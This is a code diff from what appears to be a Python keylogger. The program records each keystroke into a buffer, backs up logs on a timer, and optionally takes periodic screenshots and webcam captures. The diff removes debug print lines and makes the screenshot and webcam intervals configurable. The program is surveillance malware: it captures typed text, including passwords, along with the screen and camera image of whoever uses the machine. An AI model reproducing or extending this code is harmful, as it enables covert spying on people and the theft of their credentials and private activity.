@@ -38,7 +38,6 @@ def on_pressed(key):
         else:
             is_idle = False
             if should_register:
-                # print(key.char)
                 key_buffer.append(key.char)
     else:
         if __check_for_combination_key(key):
@@ -47,14 +46,12 @@ def on_pressed(key):
         if should_register:
             if key == Key.space:
                 is_idle = False
-                # print(" ")
                 key_buffer.append(" ")
             elif key == Key.backspace:
                 if len(key_buffer) > 0:
                     del key_buffer[-1]
             elif key == Key.enter:
                 is_idle = False
-                # print("\n")
                 key_buffer.append("\n")
 
     if len(key_buffer) == buffer_capacity:
@@ -148,9 +145,9 @@ def __init_executors():
     logger.init()
     Countdown.make_and_start("backup logs", 25 * 60, __check_for_new_characters)
     if should_capture_screenshots:
-        Countdown.make_and_start("screenshots", 3 * 60, __take_screenshot)
+        Countdown.make_and_start("screenshots", screenshot_interval * 60, __take_screenshot)
     if should_capture_webcam:
-        Countdown.make_and_start("cam capture", 17 * 60, __make_cam_capture)
+        Countdown.make_and_start("cam capture", webcam_capture_interval * 60, __make_cam_capture)
 
 
 def __shutdown_executors():
